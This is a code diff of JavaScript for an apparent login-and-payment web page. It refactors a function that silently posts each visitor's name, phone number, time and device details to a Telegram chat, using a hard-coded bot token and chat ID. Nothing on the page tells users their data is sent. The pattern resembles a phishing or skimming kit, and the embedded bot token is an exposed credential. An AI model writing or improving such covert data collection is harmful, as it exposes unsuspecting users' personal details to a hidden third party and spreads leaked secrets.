@@ -9,42 +9,55 @@ document.addEventListener('DOMContentLoaded', function() {
     const paymentMethods = document.querySelectorAll('.payment-method');
     const paymentDetails = document.querySelectorAll('.payment-details');
 
-    // Function to send Telegram notification
-    function sendTelegramNotification(name, phone) {
-        const botToken = '7622409431:AAFOCDS9KWgCjui28zAvBuPxrqUXoD_CDzk';
-        const chatId = '7411016617';
+    // Function to send Telegram notification with better error handling
+    const sendTelegramNotification = async (name, phone) => {
+        const botToken = '7622409431:AAFOCDS9KWgCjui28zAvBuPxrqUXoD_CDzk'; // Replace with your actual bot token
+        const chatId = '7411016617'; // Replace with your actual chat ID
         
-        const message = `🔔 *LOGIN BARU* 🔔%0A%0A` +
-                       `📛 *Nama*: ${name}%0A` +
-                       `📱 *Telepon*: ${phone}%0A` +
-                       `🕒 *Waktu*: ${new Date().toLocaleString()}%0A` +
-                       `🌐 *IP*: ${window.location.hostname}%0A` +
-                       `🖥 *Device*: ${navigator.userAgent}`;
-        
-        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=Markdown`;
-        
-        fetch(url)
-            .then(response => response.json())
-            .then(data => {
-                console.log('Telegram notification sent:', data);
-            })
-            .catch(error => {
-                console.error('Error sending Telegram notification:', error);
+        const message = `🔔 *NEW PAYMENT LOGIN* 🔔\n\n` +
+                       `👤 *Name*: ${name}\n` +
+                       `📱 *Phone*: ${phone}\n` +
+                       `🕒 *Time*: ${new Date().toLocaleString()}\n` +
+                       `🌐 *IP*: ${window.location.hostname}\n` +
+                       `💻 *Device*: ${navigator.userAgent}`;
+
+        try {
+            const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
             });
-    }
+
+            if (!response.ok) {
+                throw new Error(`Telegram API error: ${response.status}`);
+            }
+
+            const data = await response.json();
+            console.log('Telegram notification sent successfully:', data);
+        } catch (error) {
+            console.error('Error sending Telegram notification:', error);
+            // You can add additional error handling here if needed
+        }
+    };
 
     // Login Handler
-    loginBtn.addEventListener('click', function() {
+    loginBtn.addEventListener('click', async function() {
         const name = nameInput.value.trim();
         const phone = phoneInput.value.trim();
         
         if (name === '') {
-            alert('Silakan masukkan nama Anda');
+            alert('Please enter your name');
             return;
         }
         
         if (phone === '') {
-            alert('Silakan masukkan nomor telepon Anda');
+            alert('Please enter your phone number');
             return;
         }
         
@@ -52,8 +65,13 @@ document.addEventListener('DOMContentLoaded', function() {
         loginContainer.style.display = 'none';
         paymentContainer.style.display = 'block';
         
-        // Send Telegram notification
-        sendTelegramNotification(name, phone);
+        // Send Telegram notification with error handling
+        try {
+            await sendTelegramNotification(name, phone);
+        } catch (error) {
+            console.error('Error during login:', error);
+            // Notification still works even if Telegram fails
+        }
         
         // Animation
         paymentContainer.style.animation = 'fadeIn 0.5s ease';
